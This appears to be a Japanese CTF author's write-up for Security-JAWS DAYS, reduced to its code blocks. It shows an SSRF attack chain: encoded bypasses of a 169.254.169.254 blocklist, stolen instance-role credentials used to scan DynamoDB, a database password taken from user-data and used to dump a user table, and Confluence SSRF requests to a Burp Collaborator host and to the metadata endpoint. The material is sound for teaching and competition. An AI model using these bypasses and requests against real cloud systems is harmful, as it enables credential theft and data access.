# Security-JAWS DAYS 参加記&CTF作問者解説

> 原文: https://www.ctfiot.com/133108.html
> ID: 133108


```
<iframe src="https://example.com" width="600" height="200"></iframe>
```



```
1.0 2007-01-19 2007-03-01 2007-08-29 2007-10-10 2007-12-15 2008-02-01 2008-09-01 2009-04-04 2011-01-01 2011-05-01 2012-01-12 2014-02-25 2014-11-05 2015-10-20 2016-04-19 2016-06-30 2016-09-02 2018-03-28 2018-08-17 2018-09-24 2019-10-01 2020-10-27 2021-01-03 2021-03-23 2021-07-15 2022-07-09 2022-09-24 latest
```



```
#!/usr/bin/bash
sudo apt -y update

sudo mkdir /home/ubuntu/.flag

sudo echo "SJAWS{Get_1nst@nce_U2er_dat@!}" >> /home/ubuntu/.flag/secret
```



```
<input type="url" size="70" name="url" value="" placeholder="https://example.com/" pattern="https://.+">
```



```
Blocked: 169.254.169.254

*Block the following hostnames.
・169.254.169.254
・2852039166
・0xA9.0xFE.0xA9.0xFE
・0xA9FEA9FE
・0251.0376.0251.0376
・0251.00376.000251.0000376
・0251.254.169.254
```



```
短縮URLで回避しました

http://025177524776 で回避しました

8進数でやりました

169.254.169.254.nip.io でやりました

blocklistにあったやつを組み合わせて、8進数と10進数のmixで回避しました！
0251.254.000251.0000376
```



```
{
 "Code": "Success",
 "LastUpdated": "2023-08-25T12:53:26Z",
 "Type": "AWS-HMAC",
 "AccessKeyId": "ASIA[REDACTED-CTF-Challenge-Credential]",
 "SecretAccessKey": "[REDACTED-CTF-Challenge-Credential]",
 "Token": "[REDACTED-CTF-Challenge-Credential]",
 "Expiration": "2023-08-25T19:03:41Z"
}
```



```
$ cat ~/.aws/credentials
[ec2_role]
aws_access_key_id = ASIA[REDACTED]
aws_secret_access_key = [REDACTED]
aws_session_token = [REDACTED]
```



```
$ nslookup gakweb.scjdaysctf2023.net 
Server: 2001:268:fd07:4::1
Address: 2001:268:fd07:4::1#53

Non-authoritative answer:
Name: gakweb.scjdaysctf2023.net
Address: 35.76.58.200

$ nslookup 35.76.58.200
Server: 2001:268:fd07:4::1
Address: 2001:268:fd07:4::1#53

Non-authoritative answer:
200.58.76.35.in-addr.arpa name = ec2-35-76-58-200.ap-northeast-1.compute.amazonaws.com.

Authoritative answers can be found from:
```



```
$ cat ~/.aws/config 
[profile ec2_role]
region = ap-northeast-1
output = json
```



```
$ aws sts get-caller-identity --profile ec2_role
{
 "UserId": "AROAQZ2IU22WD6VC424J3:i-03247babbfc0cc2c7",
 "Account": "055450064556",
 "Arn": "arn:aws:sts::055450064556:assumed-role/ec2_role/i-03247babbfc0cc2c7"
}
```



```
$ aws dynamodb list-tables --profile ec2_role 
{
 "TableNames": [
 "private-ctfdb"
 ]
}
```



```
$ aws dynamodb scan --table-name private-ctfdb --profile ec2_role
{
 "Items": [
 {
 "flag": {
 "S": "SJAWS{Get_2ecr@t_1am_ke9!!}"
 }
 }
 ],
 "Count": 1,
 "ScannedCount": 1,
 "ConsumedCapacity": null
}
```



```
#!/usr/bin/bash
sudo apt -y update

sudo mkdir /home/ubuntu/.secret

sudo echo "database-1.ciy3eyquzz8p.ap-northeast-1.rds.amazonaws.com" >> /home/ubuntu/.secret/db_host
sudo echo "exporter" >> /home/ubuntu/.secret/db_user
sudo echo "TF6zZaECv7f5" >> /home/ubuntu/.secret/db_pass
```



```
$ mysql -h database-1.ciy3eyquzz8p.ap-northeast-1.rds.amazonaws.com -P 3306 -u exporter -p
Enter password: 
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 42
Server version: 8.0.33 Source distribution

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```



```
mysql> show databases;
+--------------------+
| Database |
+--------------------+
| Users |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.02 sec)

mysql> use Users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| UserInfo |
+-----------------+
1 row in set (0.01 sec)

mysql> select * from UserInfo;
+----+--------------------------+--------------+
| id | email | password |
+----+--------------------------+--------------+
| 1 | exporter@awsctfssrf.com | CQbpUKC5vX7k |
| 2 | adminsite@localhost:8444 | dummy |
+----+--------------------------+--------------+
2 rows in set (0.01 sec)
```



```
POST /plugins/servlet/gadgets/makeRequest?url=http://03jve28sg5djvfbj9f00xzjogz.burpcollaborator.net/ HTTP/1.1
Host: confluence.dev.████████.com
 ...
```



```
POST /plugins/servlet/gadgets/makeRequest HTTP/1.1
Host: confluence.dev.████████.com
 ...

url=http://169.254.169.254/latest/meta-data&httpMethod=GET&headers=X-aws-ec2-metadata-token=AQAEAH7TsExwreOTsHbZjebiYB7ypANA_l6JycUp2g0hDYNN9-kucA==
```
